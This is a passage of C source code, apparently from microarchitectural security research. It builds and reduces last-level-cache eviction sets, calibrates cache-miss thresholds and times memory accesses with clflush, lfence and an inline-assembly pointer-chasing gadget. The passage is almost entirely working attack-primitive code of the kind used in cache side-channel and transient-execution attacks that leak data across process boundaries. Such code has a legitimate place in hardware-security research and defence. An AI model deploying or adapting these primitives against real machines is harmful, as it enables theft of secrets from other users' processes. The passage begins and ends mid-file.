	maccess(addr20);
	asm volatile("lfence\n");
	maccess(addr21);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);


	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[10] = time_access(addrA);
	latenci[11] = time_access(addrB);


/*
	printf("EV0   %d %p\n", latenci[0], &latenci[0]);  
	printf("EV1   %d %p\n", latenci[1], &latenci[1]);  
	printf("EV2   %d %p\n", latenci[2], &latenci[2]);  
	printf("EV3   %d %p\n", latenci[3], &latenci[3]);  
	printf("EV4   %d %p\n", latenci[4], &latenci[4]);  
	printf("EV5   %d %p\n", latenci[5], &latenci[5]);  
	printf("EV6   %d %p\n", latenci[6], &latenci[6]);  
	printf("EV7   %d %p\n", latenci[7], &latenci[7]);  
	printf("EV8   %d %p\n", latenci[8], &latenci[8]);  
	printf("EV9   %d %p\n", latenci[9], &latenci[9]);  
	printf("EV10  %d %p\n", latenci[10], &latenci[10]);  
	printf("addrA %d %p\n", latenci[11], &latenci[11]); 
	printf("\n");
*/

	for(int m = 0; m < 12; m++) {
		if(get_cache_set_index(&latenci[m], 3) == my_set) {
			printf("[!] Same Cache Set for storing latencies\n"); 
			return -1;
		}
	}

	if (latenci[10] > INTERRUPT_THRESHOLD || latenci[11] > INTERRUPT_THRESHOLD) {
		return -1;
	}

	if(debug) {
		printf("EV11[set%d]   %d\n", get_cache_set_index(&latenci[0], 3), latenci[0]);  
		printf("EV12[set%d]   %d\n", get_cache_set_index(&latenci[1], 3), latenci[1]);  
		printf("EV13[set%d]   %d\n", get_cache_set_index(&latenci[2], 3), latenci[2]);  
		printf("EV14[set%d]   %d\n", get_cache_set_index(&latenci[3], 3), latenci[3]);  
		printf("EV15[set%d]   %d\n", get_cache_set_index(&latenci[4], 3), latenci[4]);  
		printf("EV16[set%d]   %d\n", get_cache_set_index(&latenci[5], 3), latenci[5]);  
		printf("EV17[set%d]   %d\n", get_cache_set_index(&latenci[6], 3), latenci[6]);  
		printf("EV18[set%d]   %d\n", get_cache_set_index(&latenci[7], 3), latenci[7]);  
		printf("EV19[set%d]   %d\n", get_cache_set_index(&latenci[8], 3), latenci[8]);  
		printf("EV20[set%d]   %d\n", get_cache_set_index(&latenci[9], 3), latenci[9]);  
		printf("addrA[set%d]  %d\n", get_cache_set_index(&latenci[10], 3), latenci[10]);  
		printf("addrB[set%d]  %d\n", get_cache_set_index(&latenci[11], 3), latenci[11]); 
	 	printf("\n");
		fflush(stdout);
	}

	*timeA = latenci[10];
	*timeB = latenci[11];

	return cycle;
}

static int test_eviction_setVictimAB(struct Node *addr_set, void *addrA, void *addrB, int *timeA, int *timeB)
{
	unsigned int *indicies = &array[0];
	double *values = &val_array[0];
	unsigned int cycle;
 	volatile unsigned int *t = &ticks;

 	struct Node* ptr = addr_set;
	void *addr1 = ptr->address;
	void *addr2 = ptr->next->address;
	void *addr3 = ptr->next->next->address;
	void *addr4 = ptr->next->next->next->address;
	void *addr5 = ptr->next->next->next->next->address;
	void *addr6 = ptr->next->next->next->next->next->address;
	void *addr7 = ptr->next->next->next->next->next->next->address;
	void *addr8 = ptr->next->next->next->next->next->next->next->address;
	void *addr9 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr10 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr11 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	ptr = addr_set = ptr->next->next->next->next->next->next->next->next->next->next->next;
	void *addr12 = ptr->address;
	void *addr13 = ptr->next->address;
	void *addr14 = ptr->next->next->address;
	void *addr15 = ptr->next->next->next->address;
	void *addr16 = ptr->next->next->next->next->address;
	void *addr17 = ptr->next->next->next->next->next->address;
	void *addr18 = ptr->next->next->next->next->next->next->address;
	void *addr19 = ptr->next->next->next->next->next->next->next->address;
	void *addr20 = ptr->next->next->next->next->next->next->next->next->address;
	void *addr21 = ptr->next->next->next->next->next->next->next->next->next->address;
	void *addr22 = ptr->next->next->next->next->next->next->next->next->next->next->address;
	int latenci[12];

	_mm_clflush(addr1);
	_mm_clflush(addr2);
	_mm_clflush(addr3);
	_mm_clflush(addr4);
	_mm_clflush(addr5);
	_mm_clflush(addr6);
	_mm_clflush(addr7);
	_mm_clflush(addr8);
	_mm_clflush(addr9);
	_mm_clflush(addr10);
	_mm_clflush(addr11);

	_mm_clflush(addrA);
	_mm_clflush(addrB);

	_mm_clflush(addr12);
	_mm_clflush(addr13);
	_mm_clflush(addr14);
	_mm_clflush(addr15);
	_mm_clflush(addr16);
	_mm_clflush(addr17);
	_mm_clflush(addr18);
	_mm_clflush(addr19);
	_mm_clflush(addr20);
	_mm_clflush(addr21);
	_mm_clflush(addr22);

	for(int q = 0; q < 500000; q++) {} // Wait on clflushes
    
	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);
	maccess(addrA);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);

	maccess(addr1);
	maccess(addr2);
	maccess(addr3);
	maccess(addr4);
	maccess(addr5);
	maccess(addr6);
	maccess(addr7);
	maccess(addr8);
	maccess(addr9);
	maccess(addr10);
	maccess(addr11);

	asm volatile("lfence\n");

	asm(
 	R"(
  
	lfence
	lfence
	lfence
	vzeroall
	xor %%r8, %%r8
	vmovdqa (%2), %%ymm0

	mov (%1), %%rbx
	clflush (%1)
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	mov (%%rbx), %%rcx
	clflush (%%rbx)
	mov %%rcx, %%rbx
	.REPT	512
		NOP
	.ENDR

	lfence
	movl (%4), %%r12d 
	lfence

	mov (%1), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx
	mov (%%rbx), %%rbx

	mov %%ebx, %%eax
	movl (%4,%%rax,1), %%r8d	

	.REPT   38	
		vsqrtpd %%ymm1,%%ymm1
	.ENDR
	vmovq %%xmm1, %%rax
	movl (%0,%%rax,1), %%ecx

	lfence
	lfence
	lfence

	sub %%r12d, %%r8d
	movl %%r8d, %3

	)"
        : "+r"(addrA), "+r"(bppppp), "+r"(indicies), "=r"(cycle), "+r"(t)
        : 
        : "%rax", "%rbx", "%r8", "%r12", "%eax", "%ebx", "%ecx", "%edx", "%ymm0", "%ymm1", "%ymm2", "%ymm3", "%ymm4", "%ymm5", "%ymm6", "%ymm7", "%ymm8", "%ymm9", "%ymm10", "%ymm11", "%ymm12", "%ymm13", "%ymm14", "%ymm15"
	);

	asm volatile("lfence\n");

	maccess(addr12);
	asm volatile("lfence\n");
	maccess(addr13);
	asm volatile("lfence\n");
	maccess(addr14);
	asm volatile("lfence\n");
	maccess(addr15);
	asm volatile("lfence\n");
	maccess(addr16);
	asm volatile("lfence\n");
	maccess(addr17);
	asm volatile("lfence\n");
	maccess(addr18);
	asm volatile("lfence\n");
	maccess(addr19);
	asm volatile("lfence\n");
	maccess(addr20);
	asm volatile("lfence\n");
	maccess(addr21);
	asm volatile("lfence\n");

	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);
	maccess((uint64_t)addr1^0x8000);
	maccess((uint64_t)addr2^0x8000);
	maccess((uint64_t)addr3^0x8000);
	maccess((uint64_t)addr4^0x8000);
	maccess((uint64_t)addr5^0x8000);
	maccess((uint64_t)addr6^0x8000);
	maccess((uint64_t)addr7^0x8000);
	maccess((uint64_t)addr8^0x8000);
	maccess((uint64_t)addr9^0x8000);
	maccess((uint64_t)addr10^0x8000);
	maccess((uint64_t)addr11^0x8000);
	maccess((uint64_t)addr12^0x8000);


	latenci[0] = time_access(addr12);
	latenci[1] = time_access(addr13);
	latenci[2] = time_access(addr14);
	latenci[3] = time_access(addr15);
	latenci[4] = time_access(addr16);
	latenci[5] = time_access(addr17);
	latenci[6] = time_access(addr18);
	latenci[7] = time_access(addr19);
	latenci[8] = time_access(addr20);
	latenci[9] = time_access(addr21);
	latenci[10] = time_access(addrA);
	latenci[11] = time_access(addrB);


/*
	printf("EV0   %d %p\n", latenci[0], &latenci[0]);  
	printf("EV1   %d %p\n", latenci[1], &latenci[1]);  
	printf("EV2   %d %p\n", latenci[2], &latenci[2]);  
	printf("EV3   %d %p\n", latenci[3], &latenci[3]);  
	printf("EV4   %d %p\n", latenci[4], &latenci[4]);  
	printf("EV5   %d %p\n", latenci[5], &latenci[5]);  
	printf("EV6   %d %p\n", latenci[6], &latenci[6]);  
	printf("EV7   %d %p\n", latenci[7], &latenci[7]);  
	printf("EV8   %d %p\n", latenci[8], &latenci[8]);  
	printf("EV9   %d %p\n", latenci[9], &latenci[9]);  
	printf("EV10  %d %p\n", latenci[10], &latenci[10]);  
	printf("addrA %d %p\n", latenci[11], &latenci[11]); 
	printf("\n");
*/

	for(int m = 0; m < 12; m++) {
		if(get_cache_set_index(&latenci[m], 3) == my_set) {
			printf("[!] Same Cache Set for storing latencies\n"); 
			return -1;
		}
	}

	if (latenci[10] > INTERRUPT_THRESHOLD || latenci[11] > INTERRUPT_THRESHOLD) {
		return -1;
	}

	if(debug) {
		printf("EV11[set%d]   %d\n", get_cache_set_index(&latenci[0], 3), latenci[0]);  
		printf("EV12[set%d]   %d\n", get_cache_set_index(&latenci[1], 3), latenci[1]);  
		printf("EV13[set%d]   %d\n", get_cache_set_index(&latenci[2], 3), latenci[2]);  
		printf("EV14[set%d]   %d\n", get_cache_set_index(&latenci[3], 3), latenci[3]);  
		printf("EV15[set%d]   %d\n", get_cache_set_index(&latenci[4], 3), latenci[4]);  
		printf("EV16[set%d]   %d\n", get_cache_set_index(&latenci[5], 3), latenci[5]);  
		printf("EV17[set%d]   %d\n", get_cache_set_index(&latenci[6], 3), latenci[6]);  
		printf("EV18[set%d]   %d\n", get_cache_set_index(&latenci[7], 3), latenci[7]);  
		printf("EV19[set%d]   %d\n", get_cache_set_index(&latenci[8], 3), latenci[8]);  
		printf("EV20[set%d]   %d\n", get_cache_set_index(&latenci[9], 3), latenci[9]);  
		printf("addrA[set%d]  %d\n", get_cache_set_index(&latenci[10], 3), latenci[10]);  
		printf("addrB[set%d]  %d\n", get_cache_set_index(&latenci[11], 3), latenci[11]); 
	 	printf("\n");
		fflush(stdout);
	}

	*timeA = latenci[10];
	*timeB = latenci[11];

	return cycle;
}

static int test_flush_set(struct Node *addr_set, void *victim, int offsect)
{
	int i = 0, ret = 0, latency = 0, total = 0, interrupt = 0;
	struct Node* ptr = addr_set;
	void *addr1 = (uint64_t)ptr->address ^ offsect;
	void *addr2 = (uint64_t)ptr->next->address ^ offsect;
	void *addr3 = (uint64_t)ptr->next->next->address ^ offsect;
	void *addr4 = (uint64_t)ptr->next->next->next->address ^ offsect;
	void *addr5 = (uint64_t)ptr->next->next->next->next->address ^ offsect;
	void *addr6 = (uint64_t)ptr->next->next->next->next->next->address ^ offsect;
	void *addr7 = (uint64_t)ptr->next->next->next->next->next->next->address ^ offsect;
	void *addr8 = (uint64_t)ptr->next->next->next->next->next->next->next->address ^ offsect;
	void *addr9 = (uint64_t)ptr->next->next->next->next->next->next->next->next->address ^ offsect;
	void *addr10 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->address ^ offsect;
	void *addr11 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->next->address ^ offsect;  
	void *addr12 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->next->next->address ^ offsect;  
    
  for (i = 0; i < TEST_REPETITIONS; i++) {
    maccess(victim);


    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
    maccess(addr12);
    maccess(addr1);
    maccess(addr2); 
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
    maccess(addr12);
    maccess(addr1);
    maccess(addr2);
    maccess(addr3);
    maccess(addr4);
    maccess(addr5);
    maccess(addr6);
    maccess(addr7);
    maccess(addr8);
    maccess(addr9);
    maccess(addr10);
    maccess(addr11);
    maccess(addr12);

		maccess(victim + 222); // page walk
		latency = time_access(victim);

		if (latency < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency);
			}

			total += latency;
		} else {
			interrupt++;
		}
	}

	ret = (float)total / (TEST_REPETITIONS - interrupt);

	printf("Average: %" PRIu32 "\n", ret);

	return ret > cache_miss_treshold;
}

static int test_empty_set0(struct Node *addr_set, void *victim, int offsect)
{
	int i = 0, ret = 0, latency = 0, total = 0, interrupt = 0;
  struct Node* ptr = addr_set;
  void *addr1 = (uint64_t)ptr->address ^ offsect;
  void *addr2 = (uint64_t)ptr->next->address ^ offsect;
  void *addr3 = (uint64_t)ptr->next->next->address ^ offsect;
  void *addr4 = (uint64_t)ptr->next->next->next->address ^ offsect;
  void *addr5 = (uint64_t)ptr->next->next->next->next->address ^ offsect;
  void *addr6 = (uint64_t)ptr->next->next->next->next->next->address ^ offsect;
  void *addr7 = (uint64_t)ptr->next->next->next->next->next->next->address ^ offsect;
  void *addr8 = (uint64_t)ptr->next->next->next->next->next->next->next->address ^ offsect;
  void *addr9 = (uint64_t)ptr->next->next->next->next->next->next->next->next->address ^ offsect;
  void *addr10 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->address ^ offsect;
  void *addr11 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->next->address ^ offsect;  
  void *addr12 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->next->next->address ^ offsect;   
    
  for (i = 0; i < TEST_REPETITIONS; i++) {
    maccess(victim);


		maccess(victim + 222); // page walk
		latency = time_access0(victim);

		if (latency < INTERRUPT_THRESHOLD) { 
			if (debug) {
				printf("%" PRIu32 "\n", latency);
			}

			total += latency;
		} else {
			interrupt++;
		}
	}

	ret = (float)total / (TEST_REPETITIONS - interrupt);

	printf("Average: %" PRIu32 "\n", ret);

	return ret > cache_miss_treshold;
}

static int test_empty_set(struct Node *addr_set, void *victim, int offsect)
{
	int i = 0, ret = 0, latency = 0, total = 0, interrupt = 0;
  struct Node* ptr = addr_set;
  void *addr1 = (uint64_t)ptr->address ^ offsect;
  void *addr2 = (uint64_t)ptr->next->address ^ offsect;
  void *addr3 = (uint64_t)ptr->next->next->address ^ offsect;
  void *addr4 = (uint64_t)ptr->next->next->next->address ^ offsect;
  void *addr5 = (uint64_t)ptr->next->next->next->next->address ^ offsect;
  void *addr6 = (uint64_t)ptr->next->next->next->next->next->address ^ offsect;
  void *addr7 = (uint64_t)ptr->next->next->next->next->next->next->address ^ offsect;
  void *addr8 = (uint64_t)ptr->next->next->next->next->next->next->next->address ^ offsect;
  void *addr9 = (uint64_t)ptr->next->next->next->next->next->next->next->next->address ^ offsect;
  void *addr10 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->address ^ offsect;
  void *addr11 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->next->address ^ offsect;  
  void *addr12 = (uint64_t)ptr->next->next->next->next->next->next->next->next->next->next->next->address ^ offsect;  
    
  for (i = 0; i < TEST_REPETITIONS; i++) {
    maccess(victim);


		maccess(victim + 222); // page walk
		latency = time_access(victim);

		if (latency < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency);
			}

			total += latency;
		} else {
			interrupt++;
		}
	}

	ret = (float)total / (TEST_REPETITIONS - interrupt);

	printf("Average: %" PRIu32 "\n", ret);

	return ret > cache_miss_treshold;
}

static int test_eviction_set(struct Node *addr_set, void *victim)
{
	int i = 0, ret = 0, latency = 0, total = 0, interrupt = 0;
	for (i = 0; i < TEST_REPETITIONS; i++) {
		maccess(victim);
		//maccess(victim);
		//maccess(victim);
		//maccess(victim);

		traverse_eviction_set(addr_set);

		maccess(victim + 222); // page walk
		latency = time_access(victim);

		if (latency < INTERRUPT_THRESHOLD) {
			if (debug) {
				printf("%" PRIu32 "\n", latency);
			}

			total += latency;
		} else {
			interrupt++;
		}
	}

	ret = (float)total / (TEST_REPETITIONS - interrupt);

	if (debug) {
		printf("Average: %" PRIu32 "\n", ret);
	}

	return ret > cache_miss_treshold;
}



// Adjusted from:
// 	https://github.com/cgvwzq/evsets/blob/master/evsets_api.c
static int reduce_eviction_set_gt(struct Node **eviction_set, void *victim)
{
	struct Node *cemetery = NULL;

	// Random chunk selection
	struct Node **chunks = (struct Node **)calloc(LLC_CACHE_WAYS + 1, sizeof(struct Node *));
	if (!chunks) {
		return 1;
	}

	int *ichunks = (int *)calloc(LLC_CACHE_WAYS + 1, sizeof(int)), i;
	if (!ichunks) {
		free(chunks);
		return 1;
	}

	int len = list_length(*eviction_set), cans = 0;

	// Calculate length: h = log(a/(a+1), a/n)
	double sz = (double)LLC_CACHE_WAYS / len;
	double rate = (double)LLC_CACHE_WAYS / (LLC_CACHE_WAYS + 1);
	int h = ceil(log(sz) / log(rate)), l = 0;

	// Backtrack record
	struct Node **back = (struct Node **)calloc(h * 2, sizeof(struct Node *)); // TODO: check height bound
	if (!back) {
		free(chunks);
		free(ichunks);
		return 1;
	}

	int repeat = 0;
	do {
		for (i = 0; i < LLC_CACHE_WAYS + 1; i++) {
			ichunks[i] = i;
		}

		shuffle(ichunks, LLC_CACHE_WAYS + 1);

		// Reduce
		while (len > LLC_CACHE_WAYS) {

			list_split(*eviction_set, chunks, LLC_CACHE_WAYS + 1);
			int n = 0, ret = 0;

			// Try paths
			do {
				list_from_chunks(eviction_set, chunks, ichunks[n], LLC_CACHE_WAYS + 1);
				n = n + 1;
				ret = test_eviction_set(*eviction_set, victim);
			} while (!ret && (n < LLC_CACHE_WAYS + 1));

			// If find smaller eviction set remove chunk
			if (ret && n <= LLC_CACHE_WAYS) {
				back[l] = chunks[ichunks[n - 1]]; // store ptr to discarded chunk
				cans += list_length(back[l]);	 // add length of removed chunk
				len = list_length(*eviction_set);

				// printf("\tlvl=%d: eset=%d, removed=%d (%d)\n", l, len, cans, len+cans);

				l = l + 1; // go to next lvl
			}

			// Else, re-add last removed chunk and try again
			else if (l > 0) {
				list_concat(eviction_set, chunks[ichunks[n - 1]]); // recover last case
				l = l - 1;
				cans -= list_length(back[l]);
				list_concat(eviction_set, back[l]);
				back[l] = NULL;
				len = list_length(*eviction_set);
				goto mycont;
			} else {
				list_concat(eviction_set, chunks[ichunks[n - 1]]); // recover last case
				break;
			}
		}

		break;
	mycont:
		// printf("\tbacktracking step\n");
		continue;

	} while (l > 0 && repeat++ < MAX_REPS_BACK);

	// recover discarded elements
	for (i = 0; i < h * 2; i++) {
		list_concat(&cemetery, back[i]);
	}

	free(chunks);
	free(ichunks);
	free(back);

	int ret = 0;
	ret = test_eviction_set(*eviction_set, victim);
	if (ret) {
		if (len > LLC_CACHE_WAYS) {
			return 1;
		}
	} else {
		return 1;
	}

	return 0; // success
}

// Adjusted from:
// 	https://github.com/cgvwzq/evsets/blob/master/evsets_api.c
static int reduce_eviction_set_naive(struct Node **eviction_set, void *victim)
{
	int eviction_set_len, cemetery_len = 0;
	int i = 0, fail = 0, ret = 0, repeat = 0;

	struct Node *cemetery = NULL;
	struct Node *candidate = NULL;

	cemetery_len = 0;
	eviction_set_len = list_length(*eviction_set);

	// While we have enough addresses in the eviction set
	while (eviction_set_len > LLC_CACHE_WAYS) {

		// Check that the eviction set is still working
		ret = test_eviction_set(*eviction_set, victim);
		if (ret) {

			// If the eviction set is working,
			// take one item out of the eviction set and put it to the cemetery
			candidate = list_pop(eviction_set);
			list_push(&cemetery, candidate);
			fail = 0;

		} else if (cemetery_len == 0) {

			// If the eviction set above was not working and the cemetery was empty
			// it means that this eviction set does not work so it's pointless to reduce it
			break;

		} else {

			// If the eviction set above was not working and the cemetery had candidates
			// then we know that the last candidate was part of the eviction set, put it back at the end
			candidate = list_pop(&cemetery);
			list_append(eviction_set, candidate);

			if (fail) {

				// If we keep readding back items something is wrong
				if (repeat > MAX_REPS_BACK) {
					break;
				}
				repeat++;
			}

			fail = 1;
		}

		eviction_set_len = list_length(*eviction_set);
		cemetery_len = list_length(cemetery);

		if (!(i++ % 300)) {
			printf("Reducing... eset=%d, removed=%d (%d)\n", eviction_set_len, cemetery_len, eviction_set_len + cemetery_len);
		}
	}

	ret = test_eviction_set(*eviction_set, victim);

	// If the eviction set works
	if (ret) {

		// but it's not fully reduced (exceed backtrack steps)
		if (eviction_set_len > LLC_CACHE_WAYS) {
			return 1;
		}

	} else {
		return 1;
	}

	return 0; // success
}

int calibrate_cache_miss_threshold(char *victim)
{
	uint32_t latency, t_flushed, t_unflushed, total, interrupt;
	int i, ret, hsz = CALIBRATION_REPETITIONS * 100;
	
	total = 0;
	interrupt = 0;
	for (i = 0; i < CALIBRATION_REPETITIONS; i++) {
		maccess(victim);
		maccess(victim);
		maccess(victim);
		maccess(victim);

		maccess(victim + 222); // page walk
		latency = time_access(victim);

		if (latency < INTERRUPT_THRESHOLD) {
			total += latency;
		} else {
			interrupt++;
		}
	}

	t_unflushed = (float)total / (CALIBRATION_REPETITIONS - interrupt);
	// printf("%" PRIu32 "\n", t_unflushed);

	interrupt = 0;
	for (i = 0; i < CALIBRATION_REPETITIONS; i++) {
		maccess(victim); // page walk
		_mm_clflush(victim);

		latency = time_access(victim);
		if (latency < INTERRUPT_THRESHOLD) {
			total += latency;
		} else {
			interrupt++;
		}
	}

	t_flushed = (float)total / (CALIBRATION_REPETITIONS - interrupt);
	// printf("%" PRIu32 "\n", t_flushed);

	if (t_flushed < t_unflushed) {
		return -1;
	} else {
		return (t_flushed + t_unflushed * 2) / 3;
	}
}


struct Node* static_eviction_set1(int *len_addr) {
  struct Node *eviction_set = NULL;
  list_append(&eviction_set, (void *)0x7fffed8a0000);
  list_append(&eviction_set, (void *)0x7fffedb80000);
  list_append(&eviction_set, (void *)0x7ffff1240000);
  list_append(&eviction_set, (void *)0x7ffff1500000);
  list_append(&eviction_set, (void *)0x7ffff18a0000);
  list_append(&eviction_set, (void *)0x7ffff5280000);
  list_append(&eviction_set, (void *)0x7ffff56c0000);
  list_append(&eviction_set, (void *)0x7fffdf880000);
  list_append(&eviction_set, (void *)0x7fffe2940000);
  list_append(&eviction_set, (void *)0x7fffe2d00000);
  list_append(&eviction_set, (void *)0x7fffe6b60000);
  list_append(&eviction_set, (void *)0x7fffea560000);
  *len_addr = 12;
  return eviction_set;
}

struct Node* static_eviction_set2(int *len_addr) {
  struct Node *eviction_set = NULL;
  list_append(&eviction_set, (void *)0x7fffde840000);
  list_append(&eviction_set, (void *)0x7fffe1500000);
  list_append(&eviction_set, (void *)0x7fffe1600000);
  list_append(&eviction_set, (void *)0x7fffe4e00000);
  list_append(&eviction_set, (void *)0x7fffe84e0000);
  list_append(&eviction_set, (void *)0x7fffeb500000);
  list_append(&eviction_set, (void *)0x7fffee120000);
